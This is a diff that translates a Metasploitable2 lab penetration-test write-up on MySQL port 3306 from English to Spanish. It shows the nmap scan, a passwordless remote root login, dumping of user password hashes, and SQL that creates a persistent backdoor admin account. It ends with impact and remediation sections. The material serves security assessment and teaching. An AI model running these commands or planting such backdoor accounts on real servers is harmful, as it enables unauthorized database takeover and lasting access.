@@ -1,124 +1,148 @@
-# ✅ MySQL Service Exploitation (Port 3306)
+# ✅ Explotación del Servicio MySQL (Puerto 3306)
 
-## 🔹 Overview
-During the assessment of the Metasploitable2 target, the MySQL service running on port **3306** was identified as critically misconfigured. The database server allows **remote authentication as `root` without a password**, enabling full control of all databases and the ability to create persistent backdoor accounts.
+## 🔹 Visión General
+
+Durante la evaluación del objetivo **Metasploitable2**, se identificó que el servicio **MySQL** que se ejecuta en el puerto **3306** estaba **críticamente mal configurado**. El servidor de bases de datos permite la **autenticación remota como `root` sin contraseña**, lo que otorga control total sobre todas las bases de datos y la capacidad de crear cuentas persistentes tipo backdoor.
 
 ---
 
-## 🔹 1. Service Enumeration
+## 🔹 1. Enumeración del Servicio
 
-### ✅ Port Scan
+### ✅ Escaneo de Puertos
+
 ```bash
 nmap -p3306 -sV 192.168.56.101
+```
 
-Result:
+**Resultado:**
 
-    Service: MySQL
+```text
+Service: MySQL
+Version: 5.0.51a-3ubuntu5
+Remote connections: Enabled
+SSL/TLS: Not enforced
+```
 
-    Version: 5.0.51a-3ubuntu5
+Esta versión está **obsoleta** y carece de mecanismos de seguridad modernos.
 
-    Remote connections: Enabled
+---
 
-    SSL/TLS: Not enforced
+## 🔹 2. Inicio de Sesión Remoto sin Contraseña
 
-This version is outdated and lacks modern security mechanisms.
-🔹 2. Remote Login Without Password
+Los intentos iniciales de conexión fallaron debido a errores de negociación SSL. Sin embargo, al deshabilitar SSL se obtuvo acceso:
 
-Initial login attempts failed due to SSL negotiation errors. However, disabling SSL allowed access:
-
+```bash
 mysql -h 192.168.56.101 -u root --skip-ssl
+```
 
-✅ Login was successful without a password, confirming a critical authentication vulnerability.
-🔹 3. Database Enumeration
+✅ El inicio de sesión fue exitoso **sin contraseña**, confirmando una vulnerabilidad crítica de autenticación.
 
-Once authenticated, all databases on the server were accessible:
+---
 
+## 🔹 3. Enumeración de Bases de Datos
+
+Una vez autenticado, todas las bases de datos del servidor eran accesibles:
+
+```sql
 SHOW DATABASES;
+```
 
-Discovered Databases:
+**Bases de datos descubiertas:**
 
-    information_schema
+```text
+information_schema
+dvwa
+metasploit
+mysql
+owasp10
+tikiwiki
+tikiwiki195
+```
 
-    dvwa
+Estas bases de datos contienen información potencialmente sensible de aplicaciones y credenciales.
 
-    metasploit
+---
 
-    mysql
+## 🔹 4. Enumeración de Usuarios y Privilegios
 
-    owasp10
+Se enumeraron los usuarios de MySQL:
 
-    tikiwiki
-
-    tikiwiki195
-
-These contain potentially sensitive application data and credentials.
-🔹 4. User Enumeration & Privileges
-
+```sql
 SELECT host, user, password FROM mysql.user;
+```
 
-Key Findings:
+**Hallazgos clave:**
 
-    root@% exists with no password.
+* Existe el usuario **root@%** sin contraseña.
+* El host `%` permite el inicio de sesión desde **cualquier IP remota**.
+* También está presente una cuenta **guest@%**.
 
-    Host % means login is allowed from any remote IP.
+La inspección de privilegios confirmó acceso total:
 
-    A guest account (guest@%) is also present.
-
-Privilege inspection confirmed full access:
-
+```sql
 SHOW GRANTS FOR 'root'@'%';
+```
 
-Result:
+**Resultado:**
 
+```text
 GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION
+```
 
-✅ The attacker has unrestricted control over every database.
-🔹 5. Persistence Through Backdoor Account
+✅ El atacante tiene **control irrestricto** sobre todas las bases de datos.
 
-To demonstrate impact, a new attacker-controlled user was created:
+---
 
+## 🔹 5. Persistencia Mediante Cuenta Backdoor
+
+Para demostrar el impacto, se creó un nuevo usuario controlado por el atacante:
+
+```sql
 CREATE USER 'attacker'@'%' IDENTIFIED BY 'pwned123';
 GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
+```
 
-✅ This provides a long-term foothold, even if the root account is later secured.
-🔹 6. Exploitation Notes
+✅ Esto proporciona un **punto de acceso persistente**, incluso si posteriormente se asegura la cuenta root.
 
-    Modern Metasploit no longer includes the mysql_udf_payload module, so direct RCE via UDF was not available.
+---
 
-    However, the level of access achieved already qualifies as full system compromise from a data security perspective.
+## 🔹 6. Notas de Explotación
 
-🔹 7. Impact Assessment
+* Las versiones modernas de **Metasploit** ya no incluyen el módulo `mysql_udf_payload`, por lo que no fue posible obtener RCE directo mediante UDF.
+* No obstante, el nivel de acceso alcanzado ya constituye un **compromiso total** desde el punto de vista de la seguridad de los datos.
 
-Severity: Critical
+---
 
-An attacker can:
+## 🔹 7. Evaluación de Impacto
 
-    Access, modify, or delete all data
+**Severidad:** Crítica
 
-    Extract credentials stored in application databases
+Un atacante puede:
 
-    Create privileged accounts
+* Acceder, modificar o eliminar todos los datos
+* Extraer credenciales almacenadas en bases de datos de aplicaciones
+* Crear cuentas privilegiadas
+* Comprometer aplicaciones conectadas (DVWA, TikiWiki, etc.)
+* Potencialmente pivotar hacia la explotación a nivel de sistema
 
-    Compromise connected applications (DVWA, TikiWiki, etc.)
+Esto representa una **violación total de la confidencialidad, integridad y disponibilidad** de la base de datos.
 
-    Potentially pivot to system-level exploitation
+---
 
-This represents a total breach of database confidentiality, integrity, and availability.
-🔹 8. Recommended Remediation
+## 🔹 8. Recomendaciones de Remediación
 
-    Set a strong password for all MySQL accounts
+* Establecer contraseñas fuertes para todas las cuentas MySQL
+* Eliminar el acceso remoto de `root@%`
+* Deshabilitar el acceso remoto si no es necesario
+* Forzar el uso de **SSL/TLS**
+* Actualizar MySQL a una versión soportada
+* Eliminar cuentas no utilizadas como `guest`
 
-    Remove root@% remote login
+---
 
-    Disable remote access unless required
+## ✅ Conclusión
 
-    Enforce SSL/TLS
+El servicio **MySQL en el puerto 3306** se encontró **críticamente vulnerable** debido a la posibilidad de inicio de sesión remoto como root sin autenticación, la falta de contraseñas y la concesión de privilegios irrestrictos. Esta mala configuración permite la toma completa del control de las bases de datos y la persistencia a largo plazo, convirtiéndose en uno de los hallazgos más graves de toda la evaluación de seguridad.
 
-    Update MySQL to a supported version
 
-    Remove unused accounts such as guest
-
-✅ Conclusion
-
-MySQL on port 3306 was found to be critically vulnerable due to an unauthenticated remote root login, lack of password enforcement, and unrestricted privileges. This misconfiguration allows complete database takeover and long-term persistence, making it one of the most severe findings in the assessment.
